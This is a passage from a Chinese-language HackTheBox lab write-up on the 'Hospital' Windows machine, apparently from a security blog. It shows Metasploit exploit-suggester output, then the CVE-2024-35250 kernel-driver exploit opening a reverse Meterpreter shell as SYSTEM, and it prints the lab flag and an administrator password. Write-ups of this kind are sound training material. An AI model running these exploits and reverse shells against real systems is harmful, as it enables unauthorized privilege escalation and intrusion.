10.10.11.241 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.                                                                                                     \n[+] 10.10.11.241 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.                                                                                                            \n[+] 10.10.11.241 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.                                                      \n[+] 10.10.11.241 - exploit/windows/local/cve_2024_30085_cloud_files: The target appears to be vulnerable.                  \n[+] 10.10.11.241 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2019. Revision number detected: 4974\n[+] 10.10.11.241 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019\n[+] 10.10.11.241 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.  \n</code></pre>\n<pre><code class=\"hljs language-bash\">msf6 exploit(windows/local/cve_2024_35250_ks_driver) > exploit\n[*] Started reverse TCP handler on 10.10.16.69:5555 \n[*] Running automatic check (<span class=\"hljs-string\">\"set AutoCheck false\"</span> to <span class=\"hljs-built_in\">disable</span>)\n[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019\n[*] Launching notepad to host the exploit...\n[*] The notepad path is: C:\\Windows\\System32\\notepad.exe\n[*] The notepad pid is: 5996\n[*] Reflectively injecting the DLL into 5996...\n[*] Sending stage (203846 bytes) to 10.10.11.241\n[*] Meterpreter session 3 opened (10.10.16.69:5555 -> 10.10.11.241:8915) at 2025-06-04 17:41:32 +0800\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrator\\Desktop><span class=\"hljs-built_in\">type</span> root.txt\n<span class=\"hljs-built_in\">type</span> root.txt\n740a3ee12653be0821f595a14c9d1aae\n</code></pre>\n<h3>提权-方案-2</h3>\n<p>因为 <code>drbrown</code> 也属于 <code>Remote Desktop</code>组，我们使用他的连接一下远程桌面</p>\n<p>登录进去后就是在 <code>Roundcube</code> 的界面，并且是以 <code>administrator</code> 用户的账户</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image21.png\" alt=\"image.png\"></p>\n<p>能看到密码：<code>Th3B3stH0sp1t4l9786!</code></p>\n<h2>总结</h2>\n<p><code>drbrown</code>其实还有一个权限</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image22.png\" alt=\"image.png\"></p>\n<blockquote>\n<p><a href=\"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#performance-log-users\">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#performance-log-users</a></p>\n</blockquote>\n<p>Members of the Performance Log Users group can manage performance counters, logs, and alerts locally on the server and from remote clients without being a member of the Administrators group.</p>\n<p>Performance Log Users 组的成员可以在服务器上本地和远程客户端管理性能计数器、日志和警报，而无需成为 Administrators 组的成员。</p>\n<p>总的来说不算难，但是感觉步骤挺多的。还有就是打靶机是真的不能心急，要冷静..</p>","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","updated":"2025-06-04","tags":["HackTheBox","Windows","Linux","FileUpload","Lay","CVE-2024-35250","RDP"],"categories":"靶机","comments":true},"recentPosts":[{"title":"HackTheBox - Machine - Bucket","slug":"HackTheBoxMachine - Bucket","date":"2025-06-06","updated":"2025-06-06","isEncrypted":false},{"title":"HackTheBox - Machine - Support","slug":"HackTheBoxMachine -Support","date":"2025-06-05","updated":"2025-06-05","isEncrypted":false},{"title":"HackTheBox - Machine - Hospital","slug":"HackTheBoxMachine - Hospital","date":"2025-06-04","updated":"2025-06-04","isEncrypted":false},{"title":"HackTheBox - Season8 - Certificate","slug":"HackTheBoxSeason8 - Certificate","date":"2025-06-02","updated":"2025-06-02","isEncrypted":true},{"title":"HackTheBox - Machine - Strutted","slug":"HackTheBoxMachine - Strutted","date":"2025-06-02","updated":"2025-06-02","isEncrypted":false}]},"__N_SSG":true}